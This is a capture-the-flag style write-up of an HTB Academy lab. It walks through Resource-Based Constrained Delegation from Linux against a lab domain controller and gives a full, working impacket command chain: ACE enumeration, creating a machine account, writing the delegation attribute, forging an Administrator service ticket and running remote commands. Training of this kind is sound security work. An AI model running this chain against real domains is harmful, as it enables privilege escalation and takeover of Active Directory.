# RBCD from Linux

**Module:** HTB Academy — Kerberos Attacks
**Target:** `ACADEMY-KERBATTCK-2-DC01` (10.129.205.35), domain `INLANEFREIGHT.LOCAL`
**Given access:** `carole.holmes` / `Y3t4n0th3rP4ssw0rd`
**Goal:** read `C:\carole.holmes\flag.txt` on DC01

**Result:** `RBCD_Fr0M_L1Nux_1S_FuN` — Administrator-equivalent (CIFS) access on DC01 via Resource-Based Constrained Delegation, entirely from Linux with impacket (no Windows GUI, no Rubeus/PowerView/Powermad).

---

## 1. Attack chain (summary)

1. Confirm creds: `nxc smb 10.129.205.35 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd'`.
2. Enumerate ACEs on every computer object via raw `ldap3` + `impacket.ldap.ldaptypes`, filtered by `carole.holmes`'s SID — `DC01$` grants her `0x20` (`WriteProperty`), same finding as the prior Windows-based RBCD task, confirmed independently here from Linux.
3. `WriteProperty` on `DC01$` is exactly what's needed to set `msDS-AllowedToActOnBehalfOfOtherIdentity` — i.e., configure RBCD pointing at an attacker-controlled computer account.
4. `addcomputer.py` as `carole.holmes` → create `EVILPC2$` (default `ms-DS-MachineAccountQuota` lets any domain user do this).
5. `rbcd.py -action write` → write the RBCD security descriptor on `DC01$` granting `EVILPC2$` delegation rights (impacket builds/writes the binary SD for you — no hand-rolled `RawSecurityDescriptor` needed, unlike the PowerView/Windows route).
6. `getST.py` as `EVILPC2$` (S4U2Self + S4U2Proxy) impersonating `Administrator`, requesting `cifs/DC01.INLANEFREIGHT.LOCAL`.
7. `wmiexec.py -k` with the forged ticket → command execution as Administrator → read the flag.

---

## 2. Where I got stuck (and the actual fixes)

### 2.1 `nTSecurityDescriptor` came back empty on first ACL enumeration attempt

```python
c.search(..., attributes=['sAMAccountName','nTSecurityDescriptor'])
# e.nTSecurityDescriptor.raw_values -> [] for every entry
```
AD doesn't return the security descriptor attribute on a plain search — by default the DACL/SACL/owner/group portions are filtered out unless the client explicitly asks for them via the `LDAP_SERVER_SD_FLAGS` control (OID `1.2.840.113556.1.4.801`). Fix: use `ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)` (0x04 = DACL only) and pass it as the `controls=` argument to `search()`. After that, `nTSecurityDescriptor.raw_values[0]` is populated and parseable with `impacket.ldap.ldaptypes.SR_SECURITY_DESCRIPTOR`.

### 2.2 Confirming the right the "manual" way, without BloodHound/PowerView

Rather than trust the earlier Windows-session finding blindly, re-derived it independently from Linux:
```python
sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw[0])
for ace in sd['Dacl'].aces:
    if ace['Ace']['Sid'].formatCanonical() == carole_sid:
        print(computer_name, ace['TypeName'], hex(ace['Ace']['Mask']['Mask']))
# DC01$ ACCESS_ALLOWED_ACE 0x20   (WriteProperty)
```
Matches the prior module's PowerView result exactly (`DC01$`, `WriteProperty`) — good cross-check that the raw-LDAP enumeration approach is correct.

### 2.3 Everything else worked first try

Unlike the Windows/PowerView route (hand-building a `RawSecurityDescriptor`, sizing the byte array from `.BinaryLength`, manually computing `EVILPC$`'s RC4 hash with `Rubeus.exe hash`), impacket's dedicated `addcomputer.py` and `rbcd.py` scripts handle machine-account creation and RBCD security-descriptor construction/writing internally — no byte-array bugs to chase this time. `getST.py` directly supports `-impersonate` + arbitrary `-spn`, so no ccache `sname`-patching was needed either (unlike the constrained-delegation-from-Linux task, where the allowed SPN was `TERMSRV` and had to be relabeled to `cifs` after the fact — here the RBCD write itself targets `cifs/DC01...` directly, so the ticket comes out already correct).

### 2.4 `-target-ip` still mandatory

Same recurring lesson as every other Linux/impacket task in this module: the attacking box's DNS resolver isn't `INLANEFREIGHT.LOCAL`'s own DNS, so `-target-ip 10.129.205.35` is required on `wmiexec.py` to keep the Kerberos principal name correct while actually connecting to the right address.

---

## 3. Full command sequence (as actually run)

```bash
# 1. Confirm creds
nxc smb 10.129.205.35 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd'

# 2. Enumerate who carole.holmes has rights over (raw ldap3 + impacket ldaptypes)
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap import ldaptypes

s = Server('10.129.205.35', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\carole.holmes', password='Y3t4n0th3rP4ssw0rd',
               authentication=NTLM, auto_bind=True)

c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=carole.holmes)', attributes=['objectSid'])
sid_str = str(c.entries[0].objectSid)

controls = security_descriptor_control(sdflags=0x04)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(objectClass=computer)',
          attributes=['sAMAccountName','nTSecurityDescriptor'], controls=controls)
for e in c.entries:
    raw = e.nTSecurityDescriptor.raw_values
    if not raw:
        continue
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw[0])
    for ace in sd['Dacl'].aces:
        if ace['Ace']['Sid'].formatCanonical() == sid_str:
            print(e.sAMAccountName, ace['TypeName'], hex(ace['Ace']['Mask']['Mask']))
"
# DC01$ ACCESS_ALLOWED_ACE 0x20   (WriteProperty)

# 3. Create attacker-controlled computer account
addcomputer.py -computer-name 'EVILPC2$' -computer-pass 'Passw0rd123!' \
    -dc-ip 10.129.205.35 'INLANEFREIGHT.LOCAL/carole.holmes:Y3t4n0th3rP4ssw0rd'

# 4. Write RBCD: EVILPC2$ can now delegate to DC01$
rbcd.py -delegate-from 'EVILPC2$' -delegate-to 'DC01$' -dc-ip 10.129.205.35 -action write \
    'INLANEFREIGHT.LOCAL/carole.holmes:Y3t4n0th3rP4ssw0rd'

# 5. S4U2Self + S4U2Proxy, impersonating Administrator, direct to cifs SPN
unset KRB5CCNAME
getST.py -spn 'cifs/DC01.INLANEFREIGHT.LOCAL' -impersonate Administrator \
    -dc-ip 10.129.205.35 'INLANEFREIGHT.LOCAL/EVILPC2$:Passw0rd123!'
# -> Administrator@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache

# 6. Read the flag
export KRB5CCNAME="$(pwd)/Administrator@cifs_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache"
wmiexec.py -k -no-pass 'INLANEFREIGHT.LOCAL/Administrator@DC01.INLANEFREIGHT.LOCAL' \
    -target-ip 10.129.205.35 "type C:\carole.holmes\flag.txt"
# RBCD_Fr0M_L1Nux_1S_FuN
```

---

## 4. Flag

**`RBCD_Fr0M_L1Nux_1S_FuN`**

---

## 5. Key takeaways

- The full RBCD chain — create machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, S4U2Self/S4U2Proxy, use the ticket — has a purpose-built impacket tool for every step (`addcomputer.py`, `rbcd.py`, `getST.py`), so no hand-rolled security-descriptor byte math or Rubeus/PowerView is needed when working from Linux.
- `nTSecurityDescriptor` is empty on a default LDAP search; always add the `LDAP_SERVER_SD_FLAGS` control (`security_descriptor_control(sdflags=0x04)` in `ldap3`) to actually get the DACL back.
- Because `rbcd.py` lets you target the exact SPN class (`cifs/DC01...`) directly at write time, there's no need for the sname-substitution trick used in the constrained-delegation-from-Linux task — only classic constrained delegation's allow-list forces that relabeling.
- Same raw-LDAP ACE enumeration technique cross-validated the finding from the earlier Windows/PowerView-based RBCD task (`DC01$` → `WriteProperty` for `carole.holmes`) — useful when GUI tooling isn't available or trusted.
